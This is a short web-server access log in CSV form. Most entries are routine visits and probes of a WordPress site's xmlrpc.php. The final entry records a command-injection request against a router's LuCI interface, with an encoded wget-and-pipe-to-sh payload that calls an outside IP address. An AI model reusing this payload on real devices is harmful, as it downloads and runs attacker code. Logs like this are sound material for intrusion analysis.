ip,timestamp,method,url,protocol,status,bytes,referrer,user_agent
162.158.154.236,2024-10-21 06:56:31,POST,/xmlrpc.php,HTTP/1.1,301,560,-,mozilla/5.0 (x11; fedora; linux x86_64; rv:94.0) gecko/20100101 firefox/95.0
103.82.26.5,2024-10-21 06:56:31,GET,/,HTTP/1.1,200,15348,http://robocandidato.com.br/xmlrpc.php,mozilla/5.0 (x11; fedora; linux x86_64; rv:94.0) gecko/20100101 firefox/95.0
15.188.55.197,2024-10-21 06:59:45,POST,/ss.php,HTTP/1.1,404,490,www.google.com,"mozlila/5.0 (linux; android 7.0; sm-g892a bulid/nrd90m; wv) applewebkit/537.36 (khtml, like gecko) version/4.0 chrome/60.0.3112.107 moblie safari/537.36"
162.158.155.128,2024-10-21 07:05:13,POST,/xmlrpc.php,HTTP/1.1,301,560,-,mozilla/5.0 (x11; fedora; linux x86_64; rv:94.0) gecko/20100101 firefox/95.0
175.178.35.245,2024-10-21 07:05:14,GET,/,HTTP/1.1,200,15348,http://robocandidato.com.br/xmlrpc.php,mozilla/5.0 (x11; fedora; linux x86_64; rv:94.0) gecko/20100101 firefox/95.0
162.158.159.92,2024-10-21 07:13:20,POST,/xmlrpc.php,HTTP/1.1,301,560,-,mozilla/5.0 (x11; fedora; linux x86_64; rv:94.0) gecko/20100101 firefox/95.0
202.137.142.139,2024-10-21 07:13:21,GET,/,HTTP/1.1,200,15348,http://robocandidato.com.br/xmlrpc.php,mozilla/5.0 (x11; fedora; linux x86_64; rv:94.0) gecko/20100101 firefox/95.0
167.99.55.110,2024-10-21 07:18:00,POST,/wp-cron.php?doing_wp_cron=1729495080.5025091171264648437500,HTTP/1.1,200,259,-,wordpress/6.6.1; http://blog.thx.bz
143.110.222.166,2024-10-21 07:18:00,GET,/,HTTP/1.1,200,15340,-,"mozilla/5.0 (iphone; cpu iphone os 16_1 like mac os x) applewebkit/605.1.15 (khtml, like gecko) version/16.1 mobile/15e148 safari/604.1"
185.224.128.67,2024-10-21 07:20:46,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60),HTTP/1.1,404,434,-,go-http-client/1.1
